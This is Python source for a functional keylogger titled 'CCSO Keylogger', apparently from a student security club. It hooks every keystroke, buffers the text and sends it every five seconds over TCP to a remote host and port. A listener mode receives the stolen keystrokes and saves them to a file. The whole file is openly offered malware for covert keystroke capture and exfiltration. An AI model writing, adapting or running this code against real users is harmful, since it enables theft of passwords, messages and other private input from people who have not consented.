import argparse
import textwrap
import keyboard
import sys
import socket
import threading
from datetime import datetime

# Classes for good python developer standards :)!
class Keylogger:
    def __init__(self):
        self.args = args
        self.log = ""
        self.interval = 5
        self.master_log = ""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Handles the keyboard events, called whenever there is a keypress
    def callback(self, event):
        name = event.name

        # Format specific characters
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    # Send log over the network
    def send_log(self):
        self.master_log += self.log

        if self.log:
            # Ending timestamp
            self.end_time = datetime.now()

            # Check if there is already a socket connection, if there is, do nothing
            try:
                self.socket.connect((self.args.target, self.args.port))
            except:
                print("cant connect to socket")
                pass

            # If there is keystrokes to send, send them :^)
            if self.log:
                self.socket.send(f"\n--- New Log Instance @ {self.time} ---\n".encode())
                self.socket.send(self.log.encode())
                self.socket.send(f"\n--- End Of Log Instance @ {self.end_time} ---\n".encode())

        self.log = ""

        # Create a timer to repeatedly exfiltrate data
        timer = threading.Timer(interval=self.interval, function=self.send_log)
        timer.start()

    # For the listener - handle a received a conncetion
    def handle(self, client_socket):
        print("[+] Receieved Connection")
        buf = b""
        # Receive all the bytes and write them to a file
        while True:
            data = client_socket.recv(4096)
            if data:
                buf += data
            else:
                break
            with open(self.args.outfile, "w") as f:
                f.write(buf.decode())
                print(f"[+] Wrote data to {self.args.outfile}")

    # Create the listener to receive exfiltrated data
    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)

        # When there is a connection
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    # Start the keylogger
    def start(self):
        if self.args.listen:
            self.listen()
        else:
            # Initialize keylogger
            try:
                self.time = datetime.now()
                keyboard.on_release(callback=self.callback)
                self.send_log()
                keyboard.wait()

            # Handle a CTRL-C
            except KeyboardInterrupt:
                sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CCSO Keylogger', formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''Example:
        do this later :)
    '''))
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=9001, help='specified port')
    parser.add_argument('-t', '--target', default='0.0.0.0', help='Specified IP, default is all interfaces')
    parser.add_argument('-o', '--outfile', default='keys.log', help='Output file')

    args = parser.parse_args()

    kl = Keylogger()
    kl.start()
